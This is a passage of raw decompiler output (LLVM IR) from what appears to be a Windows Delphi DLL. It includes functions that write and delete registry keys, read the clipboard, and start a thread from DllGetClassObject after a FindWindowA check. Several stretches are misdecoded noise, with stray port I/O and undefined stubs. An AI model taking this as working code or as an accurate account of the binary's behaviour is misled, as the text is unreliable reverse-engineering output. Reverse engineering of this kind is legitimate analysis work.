  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !574
  ret i32 %21, !insn.addr !575
}

define i32 @function_404ed8() local_unnamed_addr {
dec_label_pc_404ed8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404f46() local_unnamed_addr {
dec_label_pc_404f46:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !576
  ret i32 %0, !insn.addr !576
}

define i32 @function_404f4b() local_unnamed_addr {
dec_label_pc_404f4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !577
}

define i32 @function_404f4d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404f4d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !578
}

define i32 @function_404f57() local_unnamed_addr {
dec_label_pc_404f57:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !579
  %5 = inttoptr i32 %3 to i32*, !insn.addr !579
  store i32 %4, i32* %5, align 4, !insn.addr !579
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !580
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !580
  %10 = add i8 %7, %9, !insn.addr !580
  %11 = inttoptr i32 %8 to i8*, !insn.addr !580
  store i8 %10, i8* %11, align 1, !insn.addr !580
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !581
  %14 = udiv i32 %1, 256, !insn.addr !581
  %15 = trunc i32 %14 to i8, !insn.addr !581
  %16 = add i8 %13, %15, !insn.addr !581
  %17 = load i32, i32* %edi, align 4, !insn.addr !581
  %18 = inttoptr i32 %17 to i8*, !insn.addr !581
  store i8 %16, i8* %18, align 1, !insn.addr !581
  %19 = load i8, i8* %6, align 4, !insn.addr !582
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !582
  %22 = add i8 %19, %21, !insn.addr !582
  %23 = inttoptr i32 %20 to i8*, !insn.addr !582
  store i8 %22, i8* %23, align 1, !insn.addr !582
  %24 = add i32 %0, -117, !insn.addr !583
  %25 = inttoptr i32 %24 to i8*, !insn.addr !583
  %26 = load i8, i8* %25, align 1, !insn.addr !583
  %27 = trunc i32 %2 to i8, !insn.addr !583
  %28 = add i8 %26, %27, !insn.addr !583
  store i8 %28, i8* %25, align 1, !insn.addr !583
  %29 = trunc i32 %2 to i16, !insn.addr !584
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !584
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !585
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !585
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !585
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !586
  %33 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !587
  %34 = add i32 %33, 1, !insn.addr !587
  store i32 %34, i32* @global_var_4096a8, align 4, !insn.addr !587
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !588
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !589
  ret i32 0, !insn.addr !590
}

define i32 @function_404f85() local_unnamed_addr {
dec_label_pc_404f85:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !591
  ret i32 %0, !insn.addr !591
}

define i32 @function_404f8a() local_unnamed_addr {
dec_label_pc_404f8a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !592
}

define i32 @function_404f8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f8c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !593
}

define i32 @function_404f90() local_unnamed_addr {
dec_label_pc_404f90:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !594
  %2 = add i32 %1, -1, !insn.addr !594
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !594
  ret i32 %0, !insn.addr !595
}

define i32 @function_404f98() local_unnamed_addr {
dec_label_pc_404f98:
  %eax.0.reg2mem = alloca i32, !insn.addr !596
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !597
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !598
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !599
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_405024, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !600
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_405024, i32 0, i32 0), i32 -2147483647), !insn.addr !601
  %2 = icmp eq i32 %1, 0, !insn.addr !602
  %3 = icmp eq i1 %2, false, !insn.addr !603
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !603
  br i1 %3, label %dec_label_pc_405012, label %dec_label_pc_404fcd, !insn.addr !603

dec_label_pc_404fcd:                              ; preds = %dec_label_pc_404f98
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !604
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !605
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_405040, i32 0, i32 0), i32 -2147483647), !insn.addr !605
  %6 = icmp eq i32 %5, 0, !insn.addr !606
  %7 = icmp eq i1 %6, false, !insn.addr !607
  br i1 %7, label %dec_label_pc_405009, label %dec_label_pc_404ff9, !insn.addr !607

dec_label_pc_404ff9:                              ; preds = %dec_label_pc_404fcd
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !608
  br label %dec_label_pc_405009, !insn.addr !608

dec_label_pc_405009:                              ; preds = %dec_label_pc_404ff9, %dec_label_pc_404fcd
  %9 = call i32 @function_404374(), !insn.addr !609
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !609
  br label %dec_label_pc_405012, !insn.addr !609

dec_label_pc_405012:                              ; preds = %dec_label_pc_405009, %dec_label_pc_404f98
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !610
}

define i32 @function_40501b(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_40501b:
  %esp.1.reg2mem = alloca i32, !insn.addr !611
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !611
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !611
  %6 = inttoptr i32 %3 to i32*, !insn.addr !611
  store i32 %5, i32* %6, align 4, !insn.addr !611
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !612
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !612
  %11 = add i8 %8, %10, !insn.addr !612
  %12 = inttoptr i32 %9 to i8*, !insn.addr !612
  store i8 %11, i8* %12, align 1, !insn.addr !612
  %13 = add i32 %1, 122, !insn.addr !613
  %14 = inttoptr i32 %13 to i8*, !insn.addr !613
  %15 = load i8, i8* %14, align 1, !insn.addr !613
  %16 = udiv i32 %4, 256, !insn.addr !613
  %17 = trunc i32 %16 to i8, !insn.addr !613
  %18 = add i8 %15, %17, !insn.addr !613
  store i8 %18, i8* %14, align 1, !insn.addr !613
  %19 = load i8, i8* %7, align 4, !insn.addr !614
  %20 = load i32, i32* %eax, align 4, !insn.addr !614
  %21 = trunc i32 %20 to i8, !insn.addr !614
  %22 = add i8 %19, %21, !insn.addr !614
  %23 = icmp eq i8 %22, 0, !insn.addr !614
  %24 = inttoptr i32 %20 to i8*, !insn.addr !614
  store i8 %22, i8* %24, align 1, !insn.addr !614
  %25 = trunc i32 %3 to i16, !insn.addr !615
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !615
  br i1 %23, label %26, label %dec_label_pc_405029, !insn.addr !616

; <label>:26:                                     ; preds = %dec_label_pc_40501b
  %27 = call i32 @unknown_50a0(), !insn.addr !616
  br label %dec_label_pc_405029, !insn.addr !616

dec_label_pc_405029:                              ; preds = %26, %dec_label_pc_40501b
  %28 = icmp ult i8 %22, %19, !insn.addr !614
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !617
  store i32 %29, i32* %eax, align 4, !insn.addr !617
  br i1 %28, label %dec_label_pc_405091, label %dec_label_pc_40502c, !insn.addr !618

dec_label_pc_40502c:                              ; preds = %dec_label_pc_405029
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !619, !insn.addr !614
  %31 = and i8 %30, 1, !insn.addr !614
  %32 = icmp eq i8 %31, 0, !insn.addr !614
  %33 = trunc i32 %arg4 to i16, !insn.addr !620
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !620
  %35 = inttoptr i32 %2 to i32*, !insn.addr !620
  store i32 %34, i32* %35, align 4, !insn.addr !620
  br i1 %32, label %dec_label_pc_40508c, label %dec_label_pc_405030, !insn.addr !621

dec_label_pc_405030:                              ; preds = %dec_label_pc_40502c
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !622
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !623
  %36 = add i32 %arg4, 1, !insn.addr !624
  %37 = icmp eq i32 %36, 0, !insn.addr !624
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !625
  br i1 %37, label %dec_label_pc_405097, label %dec_label_pc_405036, !insn.addr !625

dec_label_pc_405036:                              ; preds = %dec_label_pc_405030
  %38 = load i32, i32* %eax, align 4, !insn.addr !626
  %39 = add i32 %38, -1, !insn.addr !626
  store i32 %39, i32* %eax, align 4, !insn.addr !626
  %40 = trunc i32 %36 to i16, !insn.addr !627
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !627
  %42 = load i32, i32* %41, align 4, !insn.addr !627
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !627
  %43 = load i32, i32* %41, align 4, !insn.addr !628
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !628
  %44 = add i32 %arg7, 105, !insn.addr !629
  %45 = inttoptr i32 %44 to i8*, !insn.addr !629
  %46 = load i8, i8* %45, align 1, !insn.addr !629
  %47 = trunc i32 %39 to i8, !insn.addr !629
  %48 = add i8 %46, %47, !insn.addr !629
  %49 = icmp ult i8 %48, %46, !insn.addr !629
  store i8 %48, i8* %45, align 1, !insn.addr !629
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !630
  br i1 %49, label %dec_label_pc_4050b7, label %dec_label_pc_405044, !insn.addr !630

dec_label_pc_405044:                              ; preds = %dec_label_pc_405036
  %50 = icmp eq i8 %48, 0, !insn.addr !629
  br i1 %50, label %dec_label_pc_405066, label %dec_label_pc_405046, !insn.addr !631

dec_label_pc_405046:                              ; preds = %dec_label_pc_405044
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !632
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_4050b7

dec_label_pc_405066:                              ; preds = %dec_label_pc_405044
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !633
  %53 = load i32, i32* %52, align 4, !insn.addr !633
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !633
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !634
  store i32 ptrtoint ([27 x i8]* @global_var_4050fc to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !635
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !636
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !637
  %55 = add i32 %arg6, -8, !insn.addr !638
  %56 = inttoptr i32 %55 to i32*, !insn.addr !638
  store i32 0, i32* %56, align 4, !insn.addr !638
  %57 = add i32 %arg6, -12, !insn.addr !639
  %58 = inttoptr i32 %57 to i32*, !insn.addr !639
  store i32 1, i32* %58, align 4, !insn.addr !639
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !640
  ret i32 %57, !insn.addr !640

dec_label_pc_40508c:                              ; preds = %dec_label_pc_40502c
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !641

dec_label_pc_405091:                              ; preds = %dec_label_pc_405029
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !642
  %62 = add i8 %60, %61, !insn.addr !642
  %63 = inttoptr i32 %2 to i8*, !insn.addr !642
  store i8 %62, i8* %63, align 1, !insn.addr !642
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !643
  %65 = load i8, i8* %64, align 1, !insn.addr !643
  %66 = udiv i32 %arg3, 256, !insn.addr !643
  %67 = trunc i32 %66 to i8, !insn.addr !643
  %68 = add i8 %65, %67, !insn.addr !643
  store i8 %68, i8* %64, align 1, !insn.addr !643
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !643
  br label %dec_label_pc_405097, !insn.addr !643

dec_label_pc_405097:                              ; preds = %dec_label_pc_405091, %dec_label_pc_405030
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !644
  %70 = inttoptr i32 %69 to i32*, !insn.addr !644
  store i32 0, i32* %70, align 4, !insn.addr !644
  %71 = add i32 %esp.0, -8, !insn.addr !645
  %72 = inttoptr i32 %71 to i32*, !insn.addr !645
  store i32 0, i32* %72, align 4, !insn.addr !645
  %73 = add i32 %esp.0, -12, !insn.addr !646
  %74 = inttoptr i32 %73 to i32*, !insn.addr !646
  store i32 ptrtoint ([27 x i8]* @global_var_4050fc to i32), i32* %74, align 4, !insn.addr !646
  %75 = add i32 %esp.0, -16, !insn.addr !647
  %76 = inttoptr i32 %75 to i32*, !insn.addr !647
  store i32 -2147483647, i32* %76, align 4, !insn.addr !647
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !648
  %78 = call i32 @function_4034c8(), !insn.addr !649
  %79 = add i32 %78, 1, !insn.addr !650
  %80 = add i32 %esp.0, -20, !insn.addr !651
  %81 = inttoptr i32 %80 to i32*, !insn.addr !651
  store i32 %79, i32* %81, align 4, !insn.addr !651
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !652
  br label %dec_label_pc_4050b7, !insn.addr !652

dec_label_pc_4050b7:                              ; preds = %dec_label_pc_405046, %dec_label_pc_405097, %dec_label_pc_405036
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !653
  %83 = add i32 %esp.1.reload, -4, !insn.addr !654
  %84 = inttoptr i32 %83 to i32*, !insn.addr !654
  store i32 %82, i32* %84, align 4, !insn.addr !654
  %85 = add i32 %esp.1.reload, -8, !insn.addr !655
  %86 = inttoptr i32 %85 to i32*, !insn.addr !655
  store i32 1, i32* %86, align 4, !insn.addr !655
  %87 = add i32 %esp.1.reload, -12, !insn.addr !656
  %88 = inttoptr i32 %87 to i32*, !insn.addr !656
  store i32 0, i32* %88, align 4, !insn.addr !656
  %89 = add i32 %esp.1.reload, -16, !insn.addr !657
  %90 = inttoptr i32 %89 to i32*, !insn.addr !657
  store i32 ptrtoint ([10 x i8]* @global_var_405118 to i32), i32* %90, align 4, !insn.addr !657
  %91 = add i32 %arg6, -8, !insn.addr !658
  %92 = inttoptr i32 %91 to i32*, !insn.addr !658
  %93 = load i32, i32* %92, align 4, !insn.addr !658
  %94 = add i32 %esp.1.reload, -20, !insn.addr !659
  %95 = inttoptr i32 %94 to i32*, !insn.addr !659
  store i32 %93, i32* %95, align 4, !insn.addr !659
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !660
  %97 = load i32, i32* %92, align 4, !insn.addr !661
  %98 = add i32 %esp.1.reload, -24, !insn.addr !662
  %99 = inttoptr i32 %98 to i32*, !insn.addr !662
  store i32 %97, i32* %99, align 4, !insn.addr !662
  %100 = call i32 @function_404374(), !insn.addr !663
  %101 = load i32, i32* %99, align 4, !insn.addr !664
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !665
  store i32 4215029, i32* %90, align 4, !insn.addr !666
  %102 = call i32 @"@LStrClr"(), !insn.addr !667
  ret i32 %102, !insn.addr !668
}

define i32 @function_4050ee() local_unnamed_addr {
dec_label_pc_4050ee:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !669
  ret i32 %0, !insn.addr !669
}

define i32 @function_4050f3() local_unnamed_addr {
dec_label_pc_4050f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !670
}

define i32 @function_4050f5() local_unnamed_addr {
dec_label_pc_4050f5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !671
}

define i32 @function_4050f9(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4050f9:
  %.reg2mem = alloca i32, !insn.addr !672
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !672
  %5 = inttoptr i32 %2 to i8*, !insn.addr !672
  store i8 %4, i8* %5, align 1, !insn.addr !672
  %6 = add i32 %0, 111, !insn.addr !673
  %7 = inttoptr i32 %6 to i8*, !insn.addr !673
  %8 = load i8, i8* %7, align 1, !insn.addr !673
  %9 = trunc i32 %1 to i8, !insn.addr !673
  %10 = add i8 %8, %9, !insn.addr !673
  %11 = icmp eq i8 %10, 0, !insn.addr !673
  store i8 %10, i8* %7, align 1, !insn.addr !673
  br i1 %11, label %12, label %dec_label_pc_405101, !insn.addr !674

; <label>:12:                                     ; preds = %dec_label_pc_4050f9
  %13 = call i32 @unknown_5178(), !insn.addr !674
  br label %dec_label_pc_405101, !insn.addr !674

dec_label_pc_405101:                              ; preds = %12, %dec_label_pc_4050f9
  %14 = icmp ult i8 %10, %8, !insn.addr !673
  br i1 %14, label %dec_label_pc_405169, label %dec_label_pc_405104, !insn.addr !675

dec_label_pc_405104:                              ; preds = %dec_label_pc_405101
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !619, !insn.addr !673
  %16 = and i8 %15, 1, !insn.addr !673
  %17 = icmp eq i8 %16, 0, !insn.addr !673
  %18 = trunc i32 %arg4 to i16, !insn.addr !676
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !676
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !676
  store i32 %19, i32* %20, align 4, !insn.addr !676
  br i1 %17, label %dec_label_pc_405164, label %dec_label_pc_405108, !insn.addr !677

dec_label_pc_405108:                              ; preds = %dec_label_pc_405104
  %21 = add i32 %arg4, 1, !insn.addr !678
  %22 = icmp eq i32 %21, 0, !insn.addr !678
  store i32 %arg2, i32* %.reg2mem, !insn.addr !679
  br i1 %22, label %dec_label_pc_40516f, label %dec_label_pc_40510e, !insn.addr !679

dec_label_pc_40510e:                              ; preds = %dec_label_pc_405108
  %23 = add i32 %arg2, -1, !insn.addr !680
  %24 = trunc i32 %21 to i16, !insn.addr !681
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !681
  %26 = load i32, i32* %25, align 4, !insn.addr !681
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !681
  %27 = load i32, i32* %25, align 4, !insn.addr !682
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !682
  %28 = add i32 %arg7, 105, !insn.addr !683
  %29 = inttoptr i32 %28 to i8*, !insn.addr !683
  %30 = load i8, i8* %29, align 1, !insn.addr !683
  %31 = trunc i32 %23 to i8, !insn.addr !683
  %32 = add i8 %30, %31, !insn.addr !683
  %33 = icmp eq i8 %32, 0, !insn.addr !683
  store i8 %32, i8* %29, align 1, !insn.addr !683
  br i1 %33, label %dec_label_pc_40513e, label %dec_label_pc_40511e, !insn.addr !684

dec_label_pc_40511e:                              ; preds = %dec_label_pc_40510e
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !685
  %34 = inttoptr i32 %23 to i8*, !insn.addr !686
  %35 = load i8, i8* %34, align 1, !insn.addr !686
  %36 = add i8 %35, %31, !insn.addr !686
  store i8 %36, i8* %34, align 1, !insn.addr !686
  %37 = add i32 %arg5, 86, !insn.addr !687
  %38 = inttoptr i32 %37 to i8*, !insn.addr !687
  %39 = load i8, i8* %38, align 1, !insn.addr !687
  %40 = trunc i32 %21 to i8, !insn.addr !687
  %41 = add i8 %39, %40, !insn.addr !687
  store i8 %41, i8* %38, align 1, !insn.addr !687
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !688
  %42 = call i32 @"@LStrClr"(), !insn.addr !689
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !690
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !691
  %44 = zext i1 %43 to i32, !insn.addr !692
  ret i32 %44, !insn.addr !692

dec_label_pc_40513e:                              ; preds = %dec_label_pc_40510e
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !693
  %46 = inttoptr i32 %45 to i8*, !insn.addr !693
  %47 = load i8, i8* %46, align 2, !insn.addr !693
  %48 = mul i8 %47, 2, !insn.addr !693
  store i8 %48, i8* %46, align 2, !insn.addr !693
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !694
  %50 = icmp eq i32* %49, null, !insn.addr !695
  br i1 %50, label %dec_label_pc_405169, label %dec_label_pc_40514e, !insn.addr !696

dec_label_pc_40514e:                              ; preds = %dec_label_pc_40513e
  %51 = ptrtoint i32* %49 to i32, !insn.addr !694
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !697
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !698
  %53 = icmp eq i32* %52, null, !insn.addr !699
  br i1 %53, label %dec_label_pc_405169, label %dec_label_pc_40515a, !insn.addr !700

dec_label_pc_40515a:                              ; preds = %dec_label_pc_40514e
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !701
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !702
  br label %dec_label_pc_405164, !insn.addr !702

dec_label_pc_405164:                              ; preds = %dec_label_pc_40515a, %dec_label_pc_405104
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !703
  br label %dec_label_pc_405169, !insn.addr !703

dec_label_pc_405169:                              ; preds = %dec_label_pc_405164, %dec_label_pc_40514e, %dec_label_pc_40513e, %dec_label_pc_405101
  %56 = call i1 @CloseClipboard(), !insn.addr !704
  %57 = sext i1 %56 to i32, !insn.addr !704
  store i32 %57, i32* %.reg2mem, !insn.addr !705
  br label %dec_label_pc_40516f, !insn.addr !705

dec_label_pc_40516f:                              ; preds = %dec_label_pc_405108, %dec_label_pc_405169
  %.reload = load i32, i32* %.reg2mem, !insn.addr !706
  ret i32 %.reload, !insn.addr !706
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_405174:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !707
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !707
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !708
  %4 = inttoptr i32 %3 to i32*, !insn.addr !709
  %5 = load i32, i32* %4, align 4, !insn.addr !709
  %6 = icmp eq i32 %5, 0, !insn.addr !709
  %7 = icmp eq i1 %6, false, !insn.addr !710
  %8 = icmp eq i1 %7, false, !insn.addr !711
  br i1 %8, label %dec_label_pc_4051b0, label %dec_label_pc_405187, !insn.addr !711

dec_label_pc_405187:                              ; preds = %dec_label_pc_405174
  %9 = inttoptr i32 %0 to i8*, !insn.addr !712
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !713
  %11 = icmp eq i32* %10, null, !insn.addr !714
  %12 = icmp eq i1 %11, false, !insn.addr !715
  br i1 %12, label %dec_label_pc_4051b0, label %dec_label_pc_40519a, !insn.addr !715

dec_label_pc_40519a:                              ; preds = %dec_label_pc_405187
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4221388 to i32*), i32 0, i32* null), !insn.addr !716
  br label %dec_label_pc_4051b0, !insn.addr !716

dec_label_pc_4051b0:                              ; preds = %dec_label_pc_40519a, %dec_label_pc_405187, %dec_label_pc_405174
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !717
  store i32 0, i32* %15, align 4, !insn.addr !717
  ret i32 -2147221231, !insn.addr !718
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_4051dc:
  ret i32 0, !insn.addr !719
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_4051e0:
  ret i32 0, !insn.addr !720
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_4051e4:
  ret i32 0, !insn.addr !721
}

define i32 @function_4051e8() local_unnamed_addr {
dec_label_pc_4051e8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !722
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !722
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !722
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !723
  %2 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !724
  %3 = add i32 %2, 1, !insn.addr !724
  store i32 %3, i32* @global_var_4096ac, align 4, !insn.addr !724
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !725
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !726
  ret i32 0, !insn.addr !727
}

define i32 @function_40520d() local_unnamed_addr {
dec_label_pc_40520d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !728
  ret i32 %0, !insn.addr !728
}

define i32 @function_405212() local_unnamed_addr {
dec_label_pc_405212:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !729
}

define i32 @function_405214(i32 %arg1) local_unnamed_addr {
dec_label_pc_405214:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !730
}

define i32 @function_405218() local_unnamed_addr {
dec_label_pc_405218:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !731
  %2 = add i32 %1, -1, !insn.addr !731
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !731
  ret i32 %0, !insn.addr !732
}

define i32 @function_405220(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405220:
  %esp.0.reg2mem = alloca i32, !insn.addr !733
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !734
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !734
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !734
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !735
  %4 = call i32 @function_407508(), !insn.addr !736
  %5 = icmp ne i32 %4, 0, !insn.addr !737
  %6 = icmp eq i1 %5, false, !insn.addr !738
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !739
  br i1 %6, label %dec_label_pc_40531b, label %dec_label_pc_40525d, !insn.addr !739

dec_label_pc_40525d:                              ; preds = %dec_label_pc_405220
  switch i32 %0, label %dec_label_pc_4052a7 [
    i32 8, label %dec_label_pc_40526b
    i32 46, label %dec_label_pc_40528a
  ]

dec_label_pc_40526b:                              ; preds = %dec_label_pc_40525d
